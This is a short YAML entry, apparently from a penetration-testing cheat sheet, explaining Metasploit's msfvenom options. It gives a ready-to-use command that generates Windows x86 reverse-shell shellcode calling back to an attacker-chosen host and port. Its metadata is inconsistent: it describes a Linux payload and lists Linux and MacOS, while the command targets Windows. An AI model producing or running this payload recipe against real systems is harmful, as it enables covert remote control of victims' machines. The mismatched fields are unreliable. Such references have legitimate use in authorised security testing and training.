---
description: |
  Metasploit way to generate a reverse shell.

  Command Reference:

    Payload: The payload to generate, such as "linux/x64/shell_reverse_tcp"

    Listening Host: Your machine, used to listen for incoming connections

    Listening Port: Port on which you are listening for connections

    Format: (-f) Executable format, c in this case, which stands for C-language

    Architecture: x86 (32-bit) in this case

    Bad chars: The Bad characters (only the null byte in this case, which is always a bad char)

command: |
  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f c -a x86 -b "\x00"
  
items:
  - Shell
  
target: |
  - Linux_target
  - MacOS_target
  - Windows_target
  
OS:
  - Linux
  - MacOS
  
environment: |
  - Networking
  - Local
  
command_types:
  - Exploitation
  - Reverse_Shell
  
references:

---
